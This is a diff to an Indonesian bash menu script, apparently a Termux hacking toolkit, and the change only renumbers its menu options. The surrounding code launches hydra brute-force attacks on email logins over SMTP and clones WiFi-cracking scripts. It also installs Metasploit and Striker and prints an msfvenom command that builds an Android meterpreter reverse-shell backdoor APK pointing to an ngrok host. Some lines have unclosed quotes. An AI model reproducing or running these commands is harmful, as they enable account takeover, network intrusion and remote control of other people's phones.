@@ -94,24 +94,25 @@ echo $cyan"31).Nuyul cashtree"
 echo $red"-----------------------------"
 echo $cyan"32).Nuyul kubik"
 echo $red"-----------------------------"
-echo $cyan"34).Nuyul caping"
+echo $cyan"33).Nuyul caping"
 echo ""
 echo $blue"----------[BRUTEFORCE]----------"
-echo $cyan"35).Bruteforce 
+echo $cyan"34).Bruteforce email
+echo ""
 echo $blue"----------[HACKWIFI]----------"
-echo $cyan"37).Bobol WiFi (root accees)"
+echo $cyan"35).Bobol WiFi (root accees)"
 echo $red"-----------------------------"
-echo $cyan"38).Bobol WiFi wpa/wpa2 psk (root acces)"
+echo $cyan"36).Bobol WiFi wpa/wpa2 psk (root acces)"
 echo $red"-----------------------------"
 echo ""
 echo $blue"----------[INSTALLER]----------"
-echo $cyan"39).Install striker"
+echo $cyan"37).Install striker"
 echo $red"-----------------------------"
-echo $cyan"41).Install metasploit"
+echo $cyan"38).Install metasploit"
 echo $red"-----------------------------"
-echo $cyan"42).Install admin finder"
+echo $cyan"39).Install admin finder"
 echo $red"-----------------------------"
-echo $cyan"43).Install katoolin"
+echo $cyan"40).Install katoolin"
 echo $red"-----------------------------"
 echo ""
 read -p"No. Pilihan:" akm
@@ -726,7 +727,7 @@ nano cfg.php
 ls
 fi
 
-if [ $akm = 34 ] || [ $akm = 34 ]
+if [ $akm = 33 ] || [ $akm = 33 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -744,7 +745,7 @@ git clone https://github.com/anggaid14/caping
 cd caping
 php run.php
 
-if [ $akm = 36 ] || [ $akm = 36 ]
+if [ $akm = 34 ] || [ $akm = 34 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -768,7 +769,7 @@ read smtp
 hydra -l $target -P $file -s $port -S -v -V -t 1 smtp://$smtp $smtp
 fi
 
-if [ $akm = 37 ] || [ $akm = 37 ]
+if [ $akm = 35 ] || [ $akm = 35 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -787,7 +788,7 @@ chmod +x wifi-hacker.sh
 ./wifi-hacker.sh
 fi		
    
-if [ $akm = 38 ] || [ $akm = 38 ]
+if [ $akm = 36 ] || [ $akm = 36 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -805,7 +806,7 @@ cd wifi-hacker
 ./wifi-hacker.sh
 fi
 
-if [ $akm = 39 ] || [ $akm = 39 ]
+if [ $akm = 37 ] || [ $akm = 37 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -826,7 +827,7 @@ pip2 install -r requirements.txt
 python2 striker.py
 fi
 
-if [ $akm = 41 ] || [ $akm = 41 ]
+if [ $akm = 38 ] || [ $akm = 38 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -854,7 +855,7 @@ echo $yellow"$termux-setup-storage"
 echo $yellow"$msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=(port) R> /sdcard/backdor.apk"
 fi
 
-if [ $akm = 42 ] || [ $akm = 42 ]
+if [ $akm = 39 ] || [ $akm = 39 ]
 then
 clear
 echo $red"_______________________________________________"
@@ -877,7 +878,7 @@ ls
 python2 admin_panel_finder.py
 fi		
 
-if [ $akm = 43 ] || [ $akm = 43 ]
+if [ $akm = 40 ] || [ $akm = 40 ]
 then
 clear
 echo $red"_______________________________________________"
